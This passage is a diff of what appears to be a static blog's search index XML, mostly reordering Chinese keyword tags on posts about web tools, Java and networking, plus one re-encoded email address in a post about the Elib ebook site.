+            <tag> 隐私 </tag>
+            
+            <tag> 资源 </tag>
+            
+            <tag> 使用 </tag>
+            
+            <tag> 软件 </tag>
+            
+            <tag> 百度 </tag>
+            
+            <tag> 花瓶 </tag>
+            
+            <tag> 管理 </tag>
+            
+            <tag> 打碎 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>常用网站工具汇总</title>
       <link href="/posts/a7420835c700/"/>
       <url>/posts/a7420835c700/</url>
@@ -30,9 +831,9 @@
             
             <tag> 网站 </tag>
             
-            <tag> 图片 </tag>
-            
             <tag> 软件 </tag>
+            
+            <tag> 图片 </tag>
             
             <tag> 人声 </tag>
             
@@ -75,6 +876,8 @@
             
             <tag> 网站 </tag>
             
+            <tag> 后台 </tag>
+            
             <tag> 良心 </tag>
             
             <tag> 联网 </tag>
@@ -88,8 +891,6 @@
             <tag> sakura </tag>
             
             <tag> 内网 </tag>
-            
-            <tag> 后台 </tag>
             
         </tags>
       
@@ -116,21 +917,21 @@
             
             <tag> 免费 </tag>
             
+            <tag> 格式 </tag>
+            
+            <tag> 转换 </tag>
+            
             <tag> 视频 </tag>
             
             <tag> 网站 </tag>
             
-            <tag> 转换 </tag>
+            <tag> 软件 </tag>
             
             <tag> pdf </tag>
             
             <tag> 良心 </tag>
             
-            <tag> 软件 </tag>
-            
             <tag> all </tag>
-            
-            <tag> 格式 </tag>
             
             <tag> easy </tag>
             
@@ -338,9 +1139,9 @@
             
             <tag> 搜索 </tag>
             
-            <tag> 视频 </tag>
-            
             <tag> 资源 </tag>
+            
+            <tag> 视频 </tag>
             
             <tag> 网站 </tag>
             
@@ -377,9 +1178,9 @@
             
             <tag> 搜索 </tag>
             
-            <tag> 视频 </tag>
-            
             <tag> 资源 </tag>
+            
+            <tag> 视频 </tag>
             
             <tag> 网站 </tag>
             
@@ -416,6 +1217,8 @@
             
             <tag> 注册 </tag>
             
+            <tag> 使用 </tag>
+            
             <tag> 网站 </tag>
             
             <tag> xyz </tag>
@@ -423,8 +1226,6 @@
             <tag> 接码 </tag>
             
             <tag> 接收 </tag>
-            
-            <tag> 使用 </tag>
             
             <tag> 验证码 </tag>
             
@@ -457,17 +1258,17 @@
             
             <tag> 界面 </tag>
             
+            <tag> 转换 </tag>
+            
             <tag> 视频 </tag>
             
             <tag> 网站 </tag>
             
+            <tag> 生成 </tag>
+            
             <tag> 图片 </tag>
             
             <tag> 剪辑 </tag>
-            
-            <tag> 生成 </tag>
-            
-            <tag> 转换 </tag>
             
             <tag> pdf </tag>
             
@@ -498,9 +1299,9 @@
             
             <tag> 电子书 </tag>
             
-            <tag> 视频 </tag>
-            
             <tag> 资源 </tag>
+            
+            <tag> 视频 </tag>
             
             <tag> xyz </tag>
             
@@ -704,7 +1505,7 @@
       <link href="/posts/99359eb5db47/"/>
       <url>/posts/99359eb5db47/</url>
       
-        <content type="html"><![CDATA[<p>Elib可以搜索自己想要的书籍，比如经典书籍、古典文学、哲学、理工资料、学术论文都可以在这搜索！</p><h2 id="介绍："><a href="#介绍：" class="headerlink" title="介绍："></a>介绍：</h2><p>上海疫情，让我们又看到了一些东西，现在很困难，经济收到巨大冲击，有一部分被优化，用东哥的话讲被毕业了。。。</p><p>现在的当下，尽量多读书，看清社会运作本质，了解人性、心理学，在一些方面还是可以帮助到自己的，多读书、多学习，是当下缓解焦虑的不二法门。</p><h2 id="界面："><a href="#界面：" class="headerlink" title="界面："></a>界面：</h2><p><img src="https://static.luozhinet.com/fc/84bd92d6549889979fe8c17d86e469"></p><p><img src="https://static.luozhinet.com/a4/67371655cfba3e0e6b9a18aeded2f5"></p><h2 id="下载："><a href="#下载：" class="headerlink" title="下载："></a>下载：</h2><p>新用户在首页中没有注册选项，经过片刻摸索找到了注册的方法。</p><p>使用注册邮箱发送主题为 signup 的邮件到 <a href="mailto:&#97;&#x75;&#x74;&#x68;&#64;&#101;&#x6c;&#x69;&#98;&#x2e;&#99;&#x63;">&#97;&#x75;&#x74;&#x68;&#64;&#101;&#x6c;&#x69;&#98;&#x2e;&#99;&#x63;</a> 内容可为空。片刻会收到一封随机密码的邮件。</p><p>登录后可更改密码，然后在搜索电子书就可以下载.epub 格式的电子书了。</p><p>具体的.epub格式电子书的阅读器这里按自己的喜好打开阅读就行了</p><h2 id="地址："><a href="#地址：" class="headerlink" title="地址："></a>地址：</h2><p><a href="https://elib.cc/">https://elib.cc/</a></p>]]></content>
+        <content type="html"><![CDATA[<p>Elib可以搜索自己想要的书籍，比如经典书籍、古典文学、哲学、理工资料、学术论文都可以在这搜索！</p><h2 id="介绍："><a href="#介绍：" class="headerlink" title="介绍："></a>介绍：</h2><p>上海疫情，让我们又看到了一些东西，现在很困难，经济收到巨大冲击，有一部分被优化，用东哥的话讲被毕业了。。。</p><p>现在的当下，尽量多读书，看清社会运作本质，了解人性、心理学，在一些方面还是可以帮助到自己的，多读书、多学习，是当下缓解焦虑的不二法门。</p><h2 id="界面："><a href="#界面：" class="headerlink" title="界面："></a>界面：</h2><p><img src="https://static.luozhinet.com/fc/84bd92d6549889979fe8c17d86e469"></p><p><img src="https://static.luozhinet.com/a4/67371655cfba3e0e6b9a18aeded2f5"></p><h2 id="下载："><a href="#下载：" class="headerlink" title="下载："></a>下载：</h2><p>新用户在首页中没有注册选项，经过片刻摸索找到了注册的方法。</p><p>使用注册邮箱发送主题为 signup 的邮件到 <a href="mailto:&#x61;&#117;&#116;&#104;&#x40;&#x65;&#x6c;&#105;&#98;&#x2e;&#99;&#x63;">&#x61;&#117;&#116;&#104;&#x40;&#x65;&#x6c;&#105;&#98;&#x2e;&#99;&#x63;</a> 内容可为空。片刻会收到一封随机密码的邮件。</p><p>登录后可更改密码，然后在搜索电子书就可以下载.epub 格式的电子书了。</p><p>具体的.epub格式电子书的阅读器这里按自己的喜好打开阅读就行了</p><h2 id="地址："><a href="#地址：" class="headerlink" title="地址："></a>地址：</h2><p><a href="https://elib.cc/">https://elib.cc/</a></p>]]></content>
       
       
       <categories>
@@ -753,9 +1554,9 @@
             
             <tag> 注册 </tag>
             
-            <tag> 图片 </tag>
-            
             <tag> 处理 </tag>
+            
+            <tag> 图片 </tag>
             
             <tag> eraser </tag>
             
@@ -821,9 +1622,9 @@
             
             <tag> 视频 </tag>
             
-            <tag> 剪辑 </tag>
-            
             <tag> 生成 </tag>
+            
+            <tag> 剪辑 </tag>
             
             <tag> 智影 </tag>
             
@@ -850,15 +1651,15 @@
       
         <tags>
             
+            <tag> 处理 </tag>
+            
             <tag> 图片 </tag>
             
-            <tag> 处理 </tag>
+            <tag> 无损 </tag>
             
             <tag> 深度学习 </tag>
             
             <tag> 清图 </tag>
-            
-            <tag> 无损 </tag>
             
         </tags>
       
@@ -985,9 +1786,9 @@
             
             <tag> 文件 </tag>
             
-            <tag> 容器 </tag>
-            
             <tag> 对象 </tag>
+            
+            <tag> 容器 </tag>
             
             <tag> import </tag>
             
@@ -1132,11 +1933,11 @@
             
             <tag> 目录 </tag>
             
+            <tag> 对象 </tag>
+            
             <tag> 标签 </tag>
             
             <tag> 整数 </tag>
-            
-            <tag> 对象 </tag>
             
             <tag> 素材 </tag>
             
@@ -1304,13 +2105,13 @@
       
         <tags>
             
+            <tag> 长度 </tag>
+            
             <tag> 地址 </tag>
             
             <tag> 个数 </tag>
             
             <tag> 子网掩码 </tag>
-            
-            <tag> 长度 </tag>
             
             <tag> 255.255.255.0 </tag>
             
@@ -1629,9 +2430,9 @@
             
             <tag> auto </tag>
             
-            <tag> int </tag>
-            
             <tag> 地址 </tag>
+            
+            <tag> int </tag>
             
             <tag> image </tag>
             
@@ -1735,6 +2536,8 @@
             
             <tag> 测试 </tag>
             
+            <tag> 对象 </tag>
+            
             <tag> 标签 </tag>
             
             <tag> int </tag>
@@ -1744,8 +2547,6 @@
             <tag> java </tag>
             
             <tag> public </tag>
-            
-            <tag> 对象 </tag>
             
             <tag> import </tag>
             
@@ -1796,9 +2597,11 @@
             
             <tag> 操作 </tag>
             
-            <tag> 运算 </tag>
-            
             <tag> 对象 </tag>
+            
+            <tag> 个数 </tag>
+            
+            <tag> 运算 </tag>
             
             <tag> 分类 </tag>
             
@@ -1807,8 +2610,6 @@
             <tag> 查询 </tag>
             
             <tag> 错误 </tag>
-            
-            <tag> 个数 </tag>
             
             <tag> list </tag>
             
@@ -1912,9 +2713,9 @@
             
             <tag> 修改 </tag>
             
-            <tag> int </tag>
-            
             <tag> 地址 </tag>
+            
+            <tag> int </tag>
             
             <tag> java </tag>
             
@@ -1967,13 +2768,13 @@
             
             <tag> 创建 </tag>
             
+            <tag> 对象 </tag>
+            
             <tag> 修改 </tag>
             
             <tag> new </tag>
             
             <tag> public </tag>
-            
-            <tag> 对象 </tag>
             
             <tag> string </tag>
             
@@ -2112,6 +2913,8 @@
             
             <tag> 测试 </tag>
             
+            <tag> 对象 </tag>
+            
             <tag> int </tag>
             
             <tag> new </tag>
@@ -2119,8 +2922,6 @@
             <tag> java </tag>
             
             <tag> public </tag>
-            
-            <tag> 对象 </tag>
             
             <tag> import </tag>
             
@@ -2167,9 +2968,9 @@
             
             <tag> 方法 </tag>
             
-            <tag> 指令 </tag>
-            
             <tag> 对象 </tag>
+            
+            <tag> 指令 </tag>
             
             <tag> 素材 </tag>
             
@@ -2296,13 +3097,13 @@
       
         <tags>
             
+            <tag> 对象 </tag>
+            
             <tag> int </tag>
             
             <tag> new </tag>
             
             <tag> public </tag>
-            
-            <tag> 对象 </tag>
             
             <tag> import </tag>
             
@@ -2339,6 +3140,8 @@
             
             <tag> 方法 </tag>
             
+            <tag> 对象 </tag>
+            
             <tag> int </tag>
             
             <tag> new </tag>
@@ -2346,8 +3149,6 @@
             <tag> sum </tag>
             
             <tag> public </tag>
-            
-            <tag> 对象 </tag>
             
             <tag> geti </tag>
             
@@ -2483,11 +3284,11 @@
             
             <tag> 方法 </tag>
             
+            <tag> 对象 </tag>
+            
             <tag> int </tag>
             
             <tag> new </tag>
-            
-            <tag> 对象 </tag>
             
             <tag> string </tag>
             
